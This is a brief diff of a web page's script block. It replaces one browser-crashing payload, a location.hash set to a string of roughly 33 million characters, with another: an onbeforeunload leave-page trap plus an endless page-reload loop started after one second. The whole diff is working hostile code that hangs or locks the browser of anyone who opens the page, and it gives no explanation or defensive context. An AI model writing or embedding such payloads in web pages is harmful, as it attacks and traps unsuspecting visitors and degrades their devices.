@@ -1,3 +1,9 @@
 <script>
-   window.onload=()=>location.hash="M"+"\u0001".repeat(2**25)+"m";
+   
+   onbeforeunload = () => true;
+   
+   
+   setTimeout(function(){
+    while(1)location.reload(1)
+  }, 1000)
 </script>
